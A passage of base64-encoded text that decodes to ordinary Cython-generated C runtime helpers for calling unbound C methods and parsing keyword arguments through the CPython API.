0Q2FsbF9mYWxsYmFjayhmdW5jLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd2FyZ3MpO1xuICAgICNlbmRpZlxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3YXJncykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKnNlbGZsZXNzX2FyZ3MgPSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIDEsIFB5VHVwbGVfU2l6ZShhcmdzKSk7XG4gICAgaWYgKHVubGlrZWx5KCFzZWxmbGVzc19hcmdzKSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChtZXRob2QsIHNlbGZsZXNzX2FyZ3MsIGt3YXJncyk7XG4gICAgUHlfREVDUkVGKHNlbGZsZXNzX2FyZ3MpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7XG4gICAgICAgIHJldHVybiBfUHlPYmplY3RfVmVjdG9yY2FsbFxuICAgICAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gbmFyZ3MtMSA6IDAsIGt3bmFtZXMpO1xufVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU2VsZmxlc3NDYWxsKFB5T2JqZWN0ICptZXRob2QsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpIHtcbiAgICByZXR1cm5cbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICBfUHlPYmplY3RfVmVjdG9yY2FsbFxuI2Vsc2VcbiAgICBQeU9iamVjdF9WZWN0b3JjYWxsXG4jZW5kaWZcbiAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gKHNpemVfdCkgbmFyZ3MtMSA6IDAsIGt3bmFtZXMpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlNZXRob2REZWYgX19QeXhfVW5ib3VuZENNZXRob2RfRGVmID0ge1xuICAgICAiQ3l0aG9uVW5ib3VuZENNZXRob2QiLFxuICAgICBfX1BZWF9SRUlOVEVSUFJFVF9GVU5DSU9OKFB5Q0Z1bmN0aW9uLCBfX1B5eF9TZWxmbGVzc0NhbGwpLFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDBcbiAgICAgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUyxcbiNlbHNlXG4gICAgIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTLFxuI2VuZGlmXG4gICAgIE5VTExcbn07XG5zdGF0aWMgaW50IF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogdGFyZ2V0KSB7XG4gICAgUHlPYmplY3QgKm1ldGhvZCwgKnJlc3VsdD1OVUxMO1xuICAgIG1ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIodGFyZ2V0LT50eXBlLCAqdGFyZ2V0LT5tZXRob2RfbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKVxuICAgICAgICByZXR1cm4gLTE7XG4gICAgcmVzdWx0ID0gbWV0aG9kO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIGlmIChsaWtlbHkoX19QeXhfVHlwZUNoZWNrKG1ldGhvZCwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKVxuICAgIHtcbiAgICAgICAgUHlNZXRob2REZXNjck9iamVjdCAqZGVzY3IgPSAoUHlNZXRob2REZXNjck9iamVjdCopIG1ldGhvZDtcbiAgICAgICAgdGFyZ2V0LT5mdW5jID0gZGVzY3ItPmRfbWV0aG9kLT5tbF9tZXRoO1xuICAgICAgICB0YXJnZXQtPmZsYWcgPSBkZXNjci0+ZF9tZXRob2QtPm1sX2ZsYWdzICYgfihNRVRIX0NMQVNTIHwgTUVUSF9TVEFUSUMgfCBNRVRIX0NPRVhJU1QgfCBNRVRIX1NUQUNLTEVTUyk7XG4gICAgfSBlbHNlXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiNlbHNlXG4gICAgaWYgKFB5Q0Z1bmN0aW9uX0NoZWNrKG1ldGhvZCkpXG4jZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpzZWxmO1xuICAgICAgICBpbnQgc2VsZl9mb3VuZDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICBzZWxmID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhtZXRob2QsICJfX3NlbGZfXyIpO1xuICAgICAgICBpZiAoIXNlbGYpIHtcbiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HRVRfU0VMRihtZXRob2QpO1xuI2VuZGlmXG4gICAgICAgIHNlbGZfZm91bmQgPSAoc2VsZiAmJiBzZWxmICE9IFB5X05vbmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIFB5X1hERUNSRUYoc2VsZik7XG4jZW5kaWZcbiAgICAgICAgaWYgKHNlbGZfZm91bmQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp1bmJvdW5kX21ldGhvZCA9IFB5Q0Z1bmN0aW9uX05ldygmX19QeXhfVW5ib3VuZENNZXRob2RfRGVmLCBtZXRob2QpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF1bmJvdW5kX21ldGhvZCkpIHJldHVybiAtMTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRob2QpO1xuICAgICAgICAgICAgcmVzdWx0ID0gdW5ib3VuZF9tZXRob2Q7XG4gICAgICAgIH1cbiAgICB9XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgaWYgKHVubGlrZWx5KHRhcmdldC0+bWV0aG9kKSkge1xuICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIHRhcmdldC0+bWV0aG9kID0gcmVzdWx0O1xuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpIHtcbiAgICBpbnQgd2FzX2luaXRpYWxpemVkID0gX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYyk7XG4gICAgaWYgKGxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMiAmJiBjZnVuYy0+ZnVuYykpIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7YXJnMSwgYXJnMn07XG4gICAgICAgIGlmIChjZnVuYy0+ZmxhZyA9PSBNRVRIX0ZBU1RDQUxMKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIDIpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChjZnVuYy0+ZmxhZyA9PSAoTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFMpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCAyLCBOVUxMKTtcbiAgICB9XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBlbHNlIGlmICh1bmxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIHRtcF9jZnVuYyA9IHtcbiNpZm5kZWYgX19jcGx1c3BsdXNcbiAgICAgICAgICAgIDBcbiNlbmRpZlxuICAgICAgICB9O1xuICAgICAgICB0bXBfY2Z1bmMudHlwZSA9IGNmdW5jLT50eXBlO1xuICAgICAgICB0bXBfY2Z1bmMubWV0aG9kX25hbWUgPSBjZnVuYy0+bWV0aG9kX25hbWU7XG4gICAgICAgIHJldHVybiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMigmdG1wX2NmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKTtcbiAgICB9XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpO1xuICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKXtcbiAgICBpZiAodW5saWtlbHkoIWNmdW5jLT5mdW5jICYmICFjZnVuYy0+bWV0aG9kKSAmJiB1bmxpa2VseShfX1B5eF9UcnlVbnBhY2tVbmJvdW5kQ01ldGhvZChjZnVuYykgPCAwKSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKGNmdW5jLT5mdW5jICYmIChjZnVuYy0+ZmxhZyAmIE1FVEhfVkFSQVJHUykpIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzID0gUHlUdXBsZV9OZXcoMik7XG4gICAgICAgIGlmICh1bmxpa2VseSghYXJncykpIHJldHVybiBOVUxMO1xuICAgICAgICBQeV9JTkNSRUYoYXJnMSk7XG4gICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMCwgYXJnMSk7XG4gICAgICAgIFB5X0lOQ1JFRihhcmcyKTtcbiAgICAgICAgUHlUdXBsZV9TRVRfSVRFTShhcmdzLCAxLCBhcmcyKTtcbiAgICAgICAgaWYgKGNmdW5jLT5mbGFnICYgTUVUSF9LRVlXT1JEUylcbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X0NhbGxDRnVuY3Rpb25XaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIE5VTEwpO1xuICAgICAgICBlbHNlXG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKTtcbiAgICAgICAgUHlfREVDUkVGKGFyZ3MpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbmRpZlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3NbNF0gPSB7TlVMTCwgc2VsZiwgYXJnMSwgYXJnMn07XG4gICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChjZnVuYy0+bWV0aG9kLCBhcmdzKzEsIDMgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xuICAgIH1cbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZSA9IGFyZ25hbWVzO1xuICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykge1xuICAgICAgICBQeU9iamVjdCAqa2V5ID0gKipuYW1lO1xuICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfQ29udGFpbnMoa3dkcywga2V5KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kKSkge1xuICAgICAgICAgICAgaWYgKGZvdW5kID09IDEpIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG4jaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKFB5T2JqZWN0ICpzMSwgUHlPYmplY3QgKnMyKSB7XG4gICAgaW50IGtpbmQ7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMSk7XG4gICAgaWYgKGxlbiAhPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMikpIHJldHVybiAwO1xuICAgIGtpbmQgPSBQeVVuaWNvZGVfS0lORChzMSk7XG4gICAgaWYgKGtpbmQgIT0gUHlVbmljb2RlX0tJTkQoczIpKSByZXR1cm4gMDtcbiAgICBjb25zdCB2b2lkICpkYXRhMSA9IFB5VW5pY29kZV9EQVRBKHMxKTtcbiAgICBjb25zdCB2b2lkICpkYXRhMiA9IFB5VW5pY29kZV9EQVRBKHMyKTtcbiAgICByZXR1cm4gKG1lbWNtcChkYXRhMSwgZGF0YTIsIChzaXplX3QpIGxlbiAqIChzaXplX3QpIGtpbmQpID09IDApO1xufVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZ19zdHIoXG4gICAgUHlPYmplY3QgKmtleSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgc2l6ZV90ICppbmRleF9mb3VuZCxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lO1xuICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgUHlfaGFzaF90IGtleV9oYXNoID0gKChQeUFTQ0lJT2JqZWN0KilrZXkpLT5oYXNoO1xuICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpIHtcbiAgICAgICAga2V5X2hhc2ggPSBQeU9iamVjdF9IYXNoKGtleSk7XG4gICAgICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUpIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lO1xuICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICAgICBpZiAoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2ggJiYgX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpIHtcbiAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpO1xuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgI2Vsc2VcbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmIChQeVVuaWNvZGVfR0VUX0xFTkdUSChuYW1lX3N0cikgPT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoa2V5KSlcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCBjbXAgPSBQeVVuaWNvZGVfQ29tcGFyZShuYW1lX3N0ciwga2V5KTtcbiAgICAgICAgICAgIGlmIChjbXAgPCAwICYmIHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkge1xuICAgICAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpO1xuICAgICAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIG5hbWUgPSBhcmduYW1lcztcbiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lO1xuICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2gpKSB7XG4gICAgICAgICAgICBpZiAoX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpXG4gICAgICAgICAgICAgICAgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAoUHlVbmljb2RlX0dFVF9MRU5HVEgobmFtZV9zdHIpID09IFB5VW5pY29kZV9HRVRfTEVOR1RIKGtleSkpXG4gICAgICAgICNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobmFtZV9zdHIgPT0ga2V5KSkgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpO1xuICAgICAgICAgICAgaWYgKGNtcCA8IDAgJiYgdW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5hcmdfcGFzc2VkX3R3aWNlOlxuICAgIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgIGdvdG8gYmFkO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX25vc3RyKFxuICAgIFB5T2JqZWN0ICprZXksXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIHNpemVfdCAqaW5kZXhfZm91bmQsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTtcbiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkgZ290byBpbnZhbGlkX2tleXdvcmRfdHlwZTtcbiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgIHdoaWxlICgqbmFtZSkge1xuICAgICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7XG4gICAgICAgIGlmIChjbXAgPT0gMSkge1xuICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7XG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7XG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgbmFtZSA9IGFyZ25hbWVzO1xuICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykge1xuICAgICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7XG4gICAgICAgIGlmICh1bmxpa2VseShjbXAgIT0gMCkpIHtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMSkgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICAgICAgZWxzZSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYXJnX3Bhc3NlZF90d2ljZTpcbiAgICBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICBnb3RvIGJhZDtcbmludmFsaWRfa2V5d29yZF90eXBlOlxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMHMoKSBrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiLCBmdW5jdGlvbl9uYW1lKTtcbiAgICBnb3RvIGJhZDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnKFxuICAgIFB5T2JqZWN0ICprZXksXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIHNpemVfdCAqaW5kZXhfZm91bmQsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICByZXR1cm4gbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KGtleSkpID9cbiAgICAgICAgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKSA6XG4gICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X1JlamVjdFVua25vd25LZXl3b3JkKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5X3NzaXplX3QgcG9zID0gMDtcbiAgICBQeU9iamVjdCAqa2V5ID0gTlVMTDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGt3ZHMpO1xuICAgIHdoaWxlIChQeURpY3RfTmV4dChrd2RzLCAmcG9zLCAma2V5LCBOVUxMKSkge1xuICAgICAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgICAgICB3aGlsZSAoKm5hbWUgJiYgKCoqbmFtZSAhPSBrZXkpKSBuYW1lKys7XG4gICAgICAgIGlmICghKm5hbWUpIHtcbiAgICAgICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgUHlfSU5DUkVGKGtleSk7XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7XG4gICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTtcbiAgICAgICAgICAgIGlmIChjbXAgIT0gMSkge1xuICAgICAgICAgICAgICAgIGlmIChjbXAgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIiVzKCkgZ290IGFuIHVuZXhwZWN0ZWQga2V5d29yZCBhcmd1bWVudCBcJyVVXCciLFxuICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGtleSk7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICBhc3NlcnQoUHlFcnJfT2NjdXJyZWQoKSk7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZERpY3QoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncylcbntcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzO1xuICAgIFB5X3NzaXplX3QgZXh0cmFjdGVkID0gMDtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKVxuICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUgJiYgbnVtX2t3YXJncyA+IGV4dHJhY3RlZCkge1xuICAgICAgICBQeU9iamVjdCAqIGtleSA9ICoqbmFtZTtcbiAgICAgICAgUHlPYmplY3QgKnZhbHVlO1xuICAgICAgICBpbnQgZm91bmQgPSAwO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIGZvdW5kID0gUHlEaWN0X0dldEl0ZW1SZWYoa3dkcywga2V5LCAmdmFsdWUpO1xuICAgICAgICAjZWxzZVxuICAgICAgICB2YWx1ZSA9IFB5RGljdF9HZXRJdGVtV2l0aEVycm9yKGt3ZHMsIGtleSk7XG4gICAgICAgIGlmICh2YWx1ZSkge1x